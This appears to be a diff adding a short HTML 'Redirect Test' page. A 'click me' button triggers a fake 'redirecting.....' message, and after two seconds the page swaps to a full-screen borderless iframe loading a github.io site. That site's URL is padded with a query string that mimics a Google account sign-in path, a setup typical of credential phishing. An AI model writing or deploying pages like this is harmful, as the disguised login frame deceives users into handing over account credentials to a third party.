@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Redirect Test</title>
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      width: 100%;
+      height: 100%;
+      font-family: Arial, sans-serif;
+    }
+
+    #container {
+      width: 100%;
+      height: 100%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+    }
+
+    #redirecting {
+      font-size: 32px;
+      font-weight: bold;
+      display: none;
+    }
+
+    iframe {
+      width: 100%;
+      height: 100%;
+      border: none;
+      display: none;
+    }
+
+    button {
+      padding: 12px 24px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+
+  <div id="container">
+    <button id="btn">click me</button>
+    <div id="redirecting">redirecting.....</div>
+  </div>
+
+  <iframe
+    id="iframe"
+    src="https://frozzipies.github.io/?accounts.google.com/sign_in/google_authorization_login_page/secure_login_format">
+  </iframe>
+
+  <script>
+    document.getElementById('btn').addEventListener('click', () => {
+      document.getElementById('btn').style.display = 'none';
+      document.getElementById('redirecting').style.display = 'block';
+
+      setTimeout(() => {
+        document.getElementById('container').style.display = 'none';
+        document.getElementById('iframe').style.display = 'block';
+      }, 2000);
+    });
+  </script>
+
+</body>
+</html>
